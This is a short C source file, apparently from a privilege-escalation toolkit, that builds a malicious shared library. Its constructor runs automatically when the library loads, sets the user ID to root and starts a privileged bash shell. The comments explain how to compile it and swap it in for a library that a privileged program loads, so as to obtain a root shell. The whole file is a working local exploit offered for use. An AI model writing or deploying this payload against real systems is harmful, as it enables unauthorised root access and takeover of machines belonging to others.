// Compile as shared object: gcc -shared -fPIC -o basicshell.so basicshell.c
// Useful when system is calling a .so with privileges. Swap the shell with the original
// It should give root shell
 
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
